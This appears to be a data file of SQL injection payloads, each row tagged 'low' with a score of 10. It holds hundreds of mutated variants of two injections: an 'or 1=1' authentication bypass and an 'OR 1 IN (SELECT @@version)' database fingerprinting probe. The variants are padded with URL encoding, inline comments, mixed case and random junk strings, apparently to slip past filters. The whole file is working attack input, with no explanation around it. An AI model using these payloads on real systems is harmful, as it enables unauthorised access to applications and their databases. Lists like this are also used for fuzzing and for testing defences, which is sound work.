+or+1=1#+#+FvkyKR,low,10
+OR 1=1-- # MYSQL COMMENT -- comment,low,10
+or	1=1-- /* test */,low,10
+or 1=1# # UDiALee # RFwLyq,low,10
+OR 1=1-- # MYSQL COMMENT,low,10
+|| 1=1-- -- comment,low,10
+or%201=1--%20#%20MySQL%20comment%20--%20comment /* test */,low,10
+OR+1=1--+--+sxJQNvp,low,10
+or 1=1-- /* test */ -- comment -- tcPcMDCpE,low,10
+OR+1=1-- # MYSQL COMMENT,low,10
+or 1=1-- # wStrQb,low,10
+or	1=1--+/*+test+*/,low,10
+OR%201=1#,low,10
+or%201=1--%20#%20MySQL%20comment,low,10
+or 1=1-- /* test */ /* test */,low,10
+or%201=1--%20/*%20test%20*/,low,10
+OR 1=1-- # mYsql COMMENT /* TEST */,low,10
+OR%201=1--%20#%20DAPVSI%20/*%20TEST%20*/,low,10
+|| 1=1--,low,10
+OR 1=1-- -- COMMENT # MFIvpKt,low,10
+or%201=1--%20--%20CJKAGegd,low,10
+or/**/1=1--/**/--/**/comment,low,10
+OR/**/1=1--/**/--/**/GCTLJ,low,10
+or%201=1#%20#%20MySQL%20comment,low,10
+or+1=1--+#+dGWysF+/*+test+*/,low,10
+or+1=1-- /* test */,low,10
+or/**/1=1--/**/--/**/comment -- comment,low,10
+oR+1=1--,low,10
+OR 1=1-- # MYSQL COMMENT /* TEST */,low,10
+||/**/1=1--,low,10
+OR+1=1--	/*	test	*/,low,10
+OR 1=1-- -- MTvKlluiHR /* TEST */,low,10
+or	1=1--	#	BgiWJbeX	--	NWuzqfQGHU,low,10
+OR+1=1--,low,10
+Or 1=1#,low,10
+OR 1=1# -- QvBxEKnf,low,10
+or+1=1#+/*+test+*/%20#%20FjYrUu,low,10
+or%201=1--%20--%20IMSIdP -- JvNllMGznc,low,10
+or%201=1# /* test */,low,10
+or%201=1--%20#%20MySQL%20comment%20#%20poJFiCidmP,low,10
+or 1=1-- /* test */ -- comment,low,10
+or+1=1-- -- qfgswhq,low,10
+OR 1=1-- -- ComMeNT # FAjRcAPJt,low,10
+or+1=1#+#+LKNDu,low,10
+or%201=1--%20--%20aklwzsvt%20#%20bxanbyt,low,10
+or 1=1# # wnGMi,low,10
+or	1=1--	#	TyxetzYbp,low,10
+or%201=1--%20#%20mysql%20comment,low,10
+OR+1=1#,low,10
+|| 1=1-- /* TEST */,low,10
+or 1=1-- # mysql comment,low,10
+or/**/1=1--/**/--/**/GadbmSW,low,10
+or/**/1=1--/**/--/**/knsuQeHIqy -- DWLUzZ,low,10
+or+1=1--+#+MySQL+comment+/*+test+*/,low,10
+or 1=1# # comment,low,10
+or 1=1-- # MySQL comment # MySQL comment,low,10
+or/**/1=1-- # qGkzAo,low,10
+or	1=1--	--	CKHvicWpwG,low,10
+or+1=1-- -- onpyUuz /* test */,low,10
+or 1=1-- # MySQL comment -- PhNcwROHsa,low,10
+or	1=1--	--	comment	--	yREPM,low,10
+or%201=1-- # GTCiuedC,low,10
+OR/**/1=1-- /* tEsT */,low,10
+OR 1=1-- # MySQL comment,low,10
+or 1=1# # mysql comment,low,10
+OR	1=1--	--	sxYzhnWFy,low,10
+or 1=1# /* test */,low,10
+or%201=1--%20#%20mysql%20coMment,low,10
+or 1=1# -- jQXGj -- comment,low,10
+OR 1=1-- -- COMMENT # mYsql COMMENT,low,10
+or	1=1#	/*	test	*/,low,10
+or+1=1-- # xdqrtmse,low,10
+OR 1=1-- /* TEST */ # MYSQL COMMENT # hOLRFLm,low,10
+or%201=1--%20#%20XxyGen,low,10
+or 1=1-- /* test */ -- wJaUp # QAxAO,low,10
+OR+1=1-- # zuIXxGfqU,low,10
+OR 1=1-- -- qVCLnjEp,low,10
+or 1=1-- -- UyJypiayd,low,10
+OR	1=1-- /* test */ # aSryhLeS # MySQL comment,low,10
+or 1=1# # rmsdXjYZ # comment,low,10
+Or/**/1=1--/**/--/**/xAGReOEnm,low,10
+OR 1=1-- # inYNpEVSfS,low,10
+or 1=1-- # yhYSzkmXbr -- EwBiP,low,10
+or 1=1# # comment # xjXnRgZRZd,low,10
+OR+1=1--+#+ZYHWEBEA,low,10
+or%201=1--%20#%20VizjQxBt,low,10
+or  1=1--,low,10
+or+1=1#+--+zoaZbFBgj # FEEtBMy,low,10
+OR 1=1-- -- comment,low,10
+or%20%201=1--%20/*%20test%20*/,low,10
+OR 1=1# # COMMENT -- comment,low,10
+OR 1=1-- # QrTjy /* test */,low,10
+or/**/1=1--	#	mysql	comment,low,10
+or	1=1--	--	FWOxg,low,10
+or/**/1=1-- -- WImHRjOVWH,low,10
+or%201=1--%20#%20klRgFRw%20--%20RmwDEXshKS,low,10
+or+1=1-- -- eKtqUo,low,10
+or/**/1=1--/**/#/**/MySQL/**/comment,low,10
+or/**/1=1#/**/#/**/MySQL/**/comment,low,10
+OR 1=1# /* TEST */ /* test */ # comment,low,10
+Or 1=1-- /* tesT */,low,10
+|| 1=1# # MySQL comment,low,10
+or%201=1--%20#%20aaaajonpdg,low,10
+or%201=1--%20--%20HASgBSrx,low,10
+OR 1=1-- -- CommenT,low,10
+or+1=1--+/*+TeST+*/,low,10
+or/**/1=1-- -- yNMWnLei -- fPQrRblR # MySQL comment,low,10
+or 1=1# # BWqTnxon,low,10
+oR	1=1--	--	QAiyDUvRk,low,10
+or 1=1-- -- SDVRkwXHs,low,10
+or	1=1--	--	comment	#	MySQL	comment,low,10
+OR	1=1-- # ZrtNzBMOO,low,10
+or 1=1-- # cpCzBodAST,low,10
+oR 1=1-- -- HbZuJM,low,10
+or 1=1# # comment -- rTVYKsaa,low,10
+' OR 1 IN (SELECT @@version) --,low,10
+' or 1 in (select @@VERSION) --,low,10
+' OR 1 IN (SELECT @@version) -- /* test */,low,10
+' || 1 IN (SELECT @@version) --,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--,low,10
+' OR 1 IN (SELECT @@version) -- -- DNtmpPgqxx,low,10
+'  or  1  in  (select  @@version)  --,low,10
+' OR 1 IN (SELECT @@version) -- -- comment,low,10
+'+OR+1+IN+(SELECT+@@version)+--,low,10
+' OR 1 IN (SELECT @@version) -- # yTUgZIaU,low,10
+'	OR	1	IN	(SELECT	@@version)	--	#	AUrPEhhTHG # MySQL comment,low,10
+' OR 1 IN (SELECT @@version) -- # bQqkVrFQlT,low,10
+' OR 1 IN (SELECT @@version) -- -- KQQqn,low,10
+""" OR 1 IN (SELECT @@version) -- -- comment",low,10
+'	||	1	IN	(SELECT	@@version)	-- /* test */,low,10
+'	OR	1	IN	(SELECT	@@version)	#,low,10
+' or 1 in (select @@version) # -- EKMBNrdV,low,10
+""" or 1 iN (sELecT @@versiOn) -- /* test */",low,10
+'%20or%201%20in%20(select%20@@VERSION)%20--,low,10
+' || 1 IN (SELECT @@version) -- # UyoUlZ,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--,low,10
+'+OR+1+IN+(SELECT+@@version)+-- -- comment # MySQL comment,low,10
+' oR 1 IN (SElect @@veRSiOn) --,low,10
+' OR 1 IN (SELECT @@version) -- # MySQL comment # MySQL comment,low,10
+' OR 1 in (SELEcT @@VersioN) -- /* TESt */,low,10
+'+OR+1+IN+(SELECT+@@version)+--+/*+test+*/ -- AzyfaL,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--/**//*/**/test/**/*/,low,10
+' or 1 In (SeLECt @@VERsIon) --,low,10
+"""%20OR%201%20IN%20(SELECT%20@@version)%20-- -- HZwRXLV",low,10
+'	OR	1	IN	(SELECT	@@version)	--	/*	test	*/,low,10
+' or 1 in (select @@version) --,low,10
+"""%20OR%201%20IN%20(SELECT%20@@version)%20--",low,10
+' OR 1 IN (SELEcT @@VERSiON) --,low,10
+'%20or%201%20in%20(select%20@@version)%20--,low,10
+'+OR+1+IN+(SELECT+@@version)+-- -- dfDiXTRwki,low,10
+' OR 1 IN (SELECT @@version) -- -- comment /* test */,low,10
+' OR 1 IN (SELECT @@version) -- # MySQL comment,low,10
+' OR 1 IN (SELECT @@version) -- # HkryOUDZft,low,10
+' Or 1 In (select @@vErsiOn) -- # PKkXbkUMsO,low,10
+' OR 1 IN (SELECT @@version) -- # zIgcMLEYW,low,10
+""" || 1 IN (SELECT @@version) --",low,10
+'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--,low,10
+'	||	1	IN	(SELECT	@@version)	--,low,10
+""" OR 1 IN (SELECT @@version) -- # MySQL comment -- comment",low,10
+"""%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20SDrysIHrtZ",low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@VERSION)/**/--,low,10
+'	OR	1	IN	(SELECT	@@VERSION)	--,low,10
+' OR 1 IN (SELECT @@version) -- # FAUiLhyc # CEXUoCnbB,low,10
+'	OR	1	IN	(SELECT	@@version)	--,low,10
+'	OR	1	IN	(SELECT	@@version)	--	--	comment	--	comment,low,10
+' OR 1 IN (SELECT @@version) -- -- NbRrM,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- # AkdkUzVzye,low,10
+' || 1 IN (SELECT @@VERSION) --,low,10
+'	OR	1	IN	(SELECT	@@version)	--	#	MySQL	comment,low,10
+' OR 1 IN (SELECT @@version) -- -- XWvhZulwj,low,10
+'	OR	1	IN	(SELECT	@@version)	-- # MySQL comment # MySQL comment,low,10
+'+OR+1+IN+(SELECT+@@VERSION)+--,low,10
+' || 1 in (select @@VERSION) --,low,10
+""" OR 1 IN (SELECT @@version) --",low,10
+' OR 1 IN (SELECT @@version) -- -- iZMtqByHQg /* test */,low,10
+' or 1 iN (SELEcT @@VersioN) --,low,10
+'+OR+1+IN+(SELECT+@@version)+--+--+DoytPhs,low,10
+'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--%20--%20COMMENT,low,10
+' OR 1 IN (SELECT @@version) # /* test */ # MySQL comment,low,10
+' oR 1 in (SeLEct @@VerSION) --,low,10
+'	OR	1	iN	(SElECT	@@VErsIoN)	--,low,10
+' oR 1 In (SElECt @@veRSiOn) -- -- comment,low,10
+""" OR 1 In (sELeCT @@veRSion) -- -- zNLZpANPAr",low,10
+' OR 1 IN (SELECT @@version) -- # wQAzykQO,low,10
+' OR 1 IN (SELECT @@version) #,low,10
+' OR 1 IN (SELECT @@version) # -- comment,low,10
+' OR 1 IN (SELECT @@version) -- -- comment -- VeosNeAlz,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- -- WZZpFJPf,low,10
+' OR 1 IN (SELECT @@version) -- -- eZVyOtqbqf,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20-- /* test */,low,10
+' OR 1 in (SELEcT @@veRsIoN) --,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@VERSION)/**/--/**/--/**/MPBXLIB,low,10
+""" or 1 In (SeLecT @@VErsioN) -- # MYsqL ComMenT",low,10
+' OR 1 IN (SELECT @@version) -- # dwHWPS,low,10
+' OR 1 IN (SELECT @@version) -- # OQYdZz,low,10
+'+Or+1+In+(Select+@@VERsiOn)+--,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20comment%20--%20comment,low,10
+' OR 1 IN (SELECT @@version) -- # CVUzz,low,10
+'	||	1	in	(SElEcT	@@VERsiON)	--,low,10
+' or 1 in (select @@VERSION) -- /* TEST */ -- egjYbqPj,low,10
+' Or 1 iN (seLect @@VERSiON) --,low,10
+' or 1 in (select @@VERSION) #,low,10
+' OR 1 IN (SELECT @@version) # # MySQL comment,low,10
+'/**/Or/**/1/**/IN/**/(SELECt/**/@@VErSIOn)/**/--,low,10
+"""+OR+1+IN+(SELECT+@@version)+--",low,10
+""" OR 1 IN (SELECT @@version) -- # MySQL comment",low,10
+'+OR+1+IN+(SELECT+@@version)+-- # MySQL comment,low,10
+' or 1 in (select @@version) -- -- comment,low,10
+' or 1 in (select @@version) #,low,10
+'+||+1+IN+(SELECT+@@version)+--,low,10
+'+or+1+in+(select+@@VERSION)+--+--+oJAFDAV,low,10
+' OR 1 IN (SELECT @@version) -- -- FWGkOjclmo,low,10
+'	OR	1	IN	(SELECT	@@version)	-- # QusSxBb,low,10
+""" OR 1 IN (SELECT @@version) -- /* test */",low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20comment # qBUcGny,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- # MySQL comment,low,10
+' OR 1 IN (SELECT @@VERSION) --,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20#,low,10
+'  OR  1  IN  (SELECT  @@version)  --,low,10
+'	or	1	In	(SElECT	@@VErSion)	--,low,10
+'+or+1+in+(select+@@VERSION)+--,low,10
+"""	or	1	in	(select	@@version)	--",low,10
+' or 1 in (select @@VERSION) -- -- CEnkXnh # mYsql COMMENT,low,10
+'	OR	1	IN	(SELECT	@@version)	-- -- comment,low,10
+' OR 1 IN (SELECT @@version) -- /* test */ /* test */,low,10
+' Or 1 IN (selECt @@veRSIon) --,low,10
+'+OR+1+IN+(SELECT+@@version)+--+--+comment,low,10
+'/**/or/**/1/**/IN/**/(sEleCt/**/@@VERSIon)/**/--,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20-- -- iGESpvNN,low,10
+'	OR	1	IN	(SELECT	@@version)	-- -- okmIbkdi,low,10
+'+OR+1+IN+(SELECT+@@version)+#,low,10
+""" or 1 in (select @@VERSION) --",low,10
+' oR 1 iN (sELEcT @@vErSion) -- /* test */,low,10
+' Or 1 in (sElEct @@VERsion) --,low,10
+'/**/or/**/1/**/in/**/(select/**/@@version)/**/--,low,10
+' OR 1 IN (SELECT @@version) -- # dWBtGSm,low,10
+' OR 1 IN (SELECT @@version) -- # XbraoIUiOX,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20/*%20test%20*/,low,10
+'+OR+1+IN+(SELECT+@@version)+--+#+MySQL+comment,low,10
+' or 1 in (select @@version) -- /* test */,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20-- # EuyUzwI # AkWNlHXuK,low,10
+' OR 1 IN (SELECT @@VERSION) -- -- HOCUGKCT,low,10
+' OR 1 IN (SELECT @@version) -- -- yPYtcX,low,10
+'+OR+1+IN+(SELECT+@@version)+--+--+ZkoVuv,low,10
+' OR 1 IN (SELECT @@version) # # zJQBAM,low,10
+' || 1 IN (SELECT @@VERSION) -- /* TEST */,low,10
+'	Or	1	in	(SeLECt	@@VerSiON)	--,low,10
+""" or 1 in (select @@version) -- # rffoo",low,10
+'+OR+1+IN+(SELECT+@@version)+#+#+ZpVDXBYCcV -- NLZOB,low,10
+' OR 1 IN (SELECT @@VERSION) -- # OCQFPGRSU,low,10
+'%20or%201%20in%20(select%20@@version)%20--%20--%20pnnqpg,low,10
+"""/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- -- XfzVPi # MySQL comment",low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20CCtZW,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20#%20CMvuBU%20--%20uvfxQmhEXw,low,10
+'%20OR%201%20IN%20(SELECT%20@@VERSION)%20-- -- COMMENT,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/# -- comment -- pyvvnT,low,10
+' OR 1 IN (SELECT @@version) -- -- rHBCyvRgp,low,10
+' OR 1 IN (SELECT @@VERSION) -- -- JQTWINQSU -- COMMENT,low,10
+'		OR		1		IN		(SELECT		@@VERSION)		--%20/*%20TEST%20*/,low,10
+'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--/**/--/**/TSEFBEMWU,low,10
+""" OR 1 IN (SELECT @@VERSION) -- -- KSTQD -- comment",low,10
+'%20||%201%20IN%20(SELECT%20@@version)%20--,low,10
+'	OR	1	IN	(SELECT	@@VERSION)	#,low,10
+'+||+1+IN+(SELECT+@@version)+--+#+MySQL+comment,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/#,low,10
+""" OR 1 IN (SELECT @@version) -- # MySQL comment -- Yawccphsq",low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20#%20#%20WVYLmL,low,10
+' OR 1 IN (SELECT @@version) -- -- FjJRjGwuz # MySQL comment,low,10
+'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--/**//*/**/test/**/*/,low,10
+'+or+1+in+(select+@@version)+#,low,10
+'+Or+1+IN+(SELecT+@@vERSION)+-- -- comment,low,10
+"""  or  1  iN  (sElECt  @@veRSION)  # # QFFlRitSjG",low,10
+' OR 1 IN (SELECT @@version) -- /* test */ # fNDuP # MySQL comment,low,10
+'	or	1	in	(select	@@version)	--,low,10
+'	or	1	in	(select	@@VERSION)	--,low,10
+"""/**/or/**/1/**/in/**/(select/**/@@version)/**/--",low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20comment,low,10
+' OR 1 IN (SELECT @@version) # # kqmaXRAVXO,low,10
+""" or 1 in (select @@VERSION) #",low,10
+'/**/||/**/1/**/IN/**/(SELECT/**/@@version)/**/# # MySQL comment,low,10
+'+or+1+IN+(sELEcT+@@VERSioN)+--,low,10
+'	OR	1	iN	(SeLeCt	@@VeRSion)	--,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--/**/--/**/RkbLjxvfzT,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20#%20UezSt,low,10
+"""%20OR%201%20IN%20(SELECT%20@@version)%20--%20/*%20test%20*/",low,10
+"""/**/OR/**/1/**/IN/**/(SELECT/**/@@VERSION)/**/--",low,10
+' or 1 in (select @@version) -- -- ndtxdrlwwb # MySQL comment,low,10
+""" OR 1 IN (SELECT @@version) -- -- ILDOjNAg # MySQL comment",low,10
+' || 1 IN (SELECT @@version) -- # MySQL comment /* test */ /* test */ -- comment,low,10
+' || 1 IN (SELECT @@version) -- # MySQL comment,low,10
+'/**/||/**/1/**/in/**/(select/**/@@version)/**/--,low,10
+' or 1 in (select @@version) -- -- oiuts /* test */ -- IfzqdpO,low,10
+'	||	1	IN	(SELECT	@@version)	--	--	AfoumOV,low,10
+'/**/||/**/1/**/IN/**/(SELECT/**/@@version)/**/--,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--/**/--/**/AwXxKVu,low,10
+'	oR	1	in	(SeLECT	@@vErSIoN)	--	#	pwcyud,low,10
+' OR 1 IN (SELECT @@version) -- # NgEqmEFGXy /* test */,low,10
+'	OR	1	IN	(SELECT	@@VERSION)	-- # VeabqY,low,10
+'%20or%201%20in%20(select%20@@version)%20#,low,10
+""" or 1 in (select @@version) --",low,10
+'/**/or/**/1/**/in/**/(select/**/@@VERSION)/**/--,low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--/**/#/**/MySQL/**/comment/**/--/**/comment,low,10
+' or 1 in (select @@version) # # mysql comment /* test */,low,10
+"""/**/OR/**/1/**/IN/**/(SELECT/**/@@VERSION)/**/-- /* test */",low,10
+' || 1 IN (SELECT @@version) -- -- comment /* test */,low,10
+'	OR	1	IN	(SELECT	@@version)	--	--	comment	--	CWkiyPm	--	INtlA,low,10
+'+OR+1+IN+(SELECT+@@version)+-- /* test */ -- comment,low,10
+' or 1 IN (SeLEct @@vERSIOn) # # coMMent /* TESt */,low,10
+'%20||%201%20IN%20(SELECT%20@@version)%20--/**/--/**/comment,low,10
+' OR 1 IN (SELECT @@VERSION) -- /* TEST */,low,10
+' or 1 in (select @@VERSION) -- -- comment,low,10
+' or 1 In (seLECT @@VErSION) -- -- CoMmenT -- COMMENT,low,10
+' OR 1 IN (SELECT @@VERSION) -- # MySQL comment,low,10
+""" OR 1 IN (SELECT @@version) -- # VZDcAA # xCuaGab",low,10
+""" || 1 iN (sElect @@vErSioN) -- -- nRIaiuAXs # hEcKFY",low,10
+""" OR 1 IN (SELECT @@VERSION) -- /* TEST */ # ZAczrUr",low,10
+"""%20or%201%20in%20(select%20@@version)%20#",low,10
+' OR 1 IN (SELECT @@version) # # UyhwAM,low,10
+'+or+1+in+(select+@@VERSION)+-- # mYsql COMMENT,low,10
+' OR 1 IN (SELECT @@VERSION) -- -- COMMENT -- COMMENT /* test */,low,10
+"""/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--/**//*/**/test/**/*//**//*/**/test/**/*/ # MySQL comment",low,10
+"""	OR	1	IN	(SELECT	@@version)	--",low,10
+'%20OR%201%20IN%20(SELECT%20@@VERSION)%20-- # rTJEUUtWTU,low,10
+'/**/||/**/1/**/IN/**/(SELECT/**/@@version)/**/--	/*	test	*/	--	comment,low,10
+'/**/or/**/1/**/in/**/(select/**/@@VERSION)/**/#,low,10
+'/**/or/**/1/**/in/**/(select/**/@@version)/**/--/**/--/**/comment,low,10
+' OR 1 IN (SELECT @@version) # # MySQL comment # MySQL comment,low,10
+'+OR+1+IN+(SELECT+@@version)+--+--+lWSBfoA,low,10
+' OR 1 IN (SELECT @@VERSION) -- # mYsql COMMENT /* TEST */ # mYsql COMMENT,low,10
+' oR 1 In (sEleCT @@VErsION) --,low,10
+'%20or%201%20In%20(selecT%20@@VerSioN)%20#,low,10
+'	OR	1	IN	(SELECT	@@version)	--	--	comment,low,10
+"""	||	1	IN	(SELECT	@@version)	--	/*	test	*/ -- iTjkkVZ",low,10
+' OR 1 IN (SELECT @@VERSION) -- /* TEST */ /* TEST */ /* test */,low,10
+'+or+1+In+(sElecT+@@VeRSIoN)+--+/*+TESt+*/ # pYXHJx,low,10
+' OR 1 IN (SELECT @@VERSION) -- -- ZBKTAVAMHS,low,10
+'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--%20#%20KRLUDUQQQP%20#%20jegCOOi,low,10
+"""	OR	1	IN	(SELECT	@@VERSION)	--",low,10
+' or 1 in (select @@version) -- /* test */ # ctcrAaoMh,low,10
+' or 1 in (select @@VERSION) -- -- nCkvbprR # qOBBOdoTl,low,10
+' OR 1 IN (SELECT @@VERSION) -- # MYSQL COMMENT /* TEST */,low,10
+'	OR	1	IN	(SELECT	@@version)	--	#	NExtKvCjGp,low,10
+'+OR+1+IN+(SELECT+@@version)+#+/*+test+*/,low,10
+'	or	1	in	(select	@@VERSION)	-- # mYsql COMMENT,low,10
+"""  OR  1  IN  (SELECT  @@version)  #  #  MySQL  comment",low,10
+'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--/**/#/**/IRvDO/**/--/**/comment,low,10
+' || 1 IN (SELECT @@version) -- -- comment # MySQL comment,low,10
+' || 1 IN (SELECT @@version) #,low,10
+'/**/Or/**/1/**/In/**/(SelecT/**/@@vErsiON)/**/--,low,10
+' OR 1 IN (sElect @@VERsiON) #,low,10
+'+or+1+in+(select+@@VERSION)+#,low,10
+' or 1 in (select @@version) -- # tTszQSvySq,low,10
+'+Or+1+in+(SeLeCT+@@versIOn)+#,low,10
+"""/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--",low,10
+'	oR	1	IN	(SELecT	@@vERSiOn)	--,low,10
+'%20||%201%20IN%20(SELECT%20@@version)%20-- # mnSJbGi,low,10
+'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20iNIMIkpriL,low,10
+' OR 1 IN (SELECT @@VERSION) -- # ljfLIFVlc,low,10
+'+or+1+in+(select+@@version)+--+--+lkyrqaq,low,10
+' or 1 in (select @@VERSION) # # DZJdZ,low,10
+' OR 1 IN (SELECT @@version) -- # MySQL comment -- comment -- comment,low,10
+' or 1 in (select @@VERSION) -- -- comment # ninFMPaKk,low,10
+' OR 1 IN (SELECT @@VERSION) #,low,10
+' oR 1 IN (sELECT @@veRSIon) --,low,10
+' or 1 in (select @@version) -- -- hQMYs,low,10
